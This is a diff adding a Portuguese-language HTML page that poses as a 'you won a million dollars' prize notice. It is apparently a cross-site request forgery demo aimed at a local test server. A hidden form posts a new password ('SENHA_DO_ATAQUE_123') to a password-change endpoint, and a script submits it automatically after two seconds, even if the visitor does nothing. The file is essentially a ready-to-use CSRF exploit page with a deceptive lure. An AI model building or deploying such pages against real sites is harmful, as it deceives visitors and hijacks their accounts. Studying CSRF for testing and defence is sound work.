@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Você ganhou um prêmio!</title>
+    <style>
+        /* ... seus estilos ... */
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Parabéns! Você ganhou um milhão de dólares!</h1>
+        <p>Clique no botão abaixo para resgatar seu prêmio (ou apenas aguarde 2 segundos!).</p>
+        <button onclick="document.getElementById('csrf-form').submit();">Resgatar Agora!</button>
+
+        <form id="csrf-form" action="http://localhost:3000/change-password-protected" method="POST" style="display:none;">
+            <input type="hidden" name="new_password" value="SENHA_DO_ATAQUE_123">
+        </form>
+
+        <script>
+            // Opcional: Submeter o formulário automaticamente após alguns segundos
+            setTimeout(() => {
+                document.getElementById('csrf-form').submit();
+            }, 2000); // Submete após 2 segundos
+        </script>
+    </div>
+</body>
+</html>
